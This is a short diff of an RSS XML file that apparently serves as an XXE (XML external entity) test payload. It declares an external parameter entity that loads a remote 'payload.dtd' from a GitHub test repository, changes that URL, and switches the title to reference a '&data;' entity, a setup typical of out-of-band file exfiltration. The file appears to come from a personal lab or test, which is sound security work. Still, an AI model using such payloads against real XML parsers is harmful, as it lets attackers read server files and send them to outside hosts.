@@ -1,14 +1,14 @@
 <?xml version="1.0"?>
 <!DOCTYPE rss [
   <!ELEMENT rss ANY>
-  <!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/chrislam82/XML_test_82/master/payload.dtd">
+  <!ENTITY % sp SYSTEM "https://github.com/chrislam82/XML_test_82/blob/master/payload.dtd">
   %sp;
 ]>
 <rss>
     <channel>
         <item>
             <title>
-               &sp;
+               &data;
                title
             </title>
             <link>
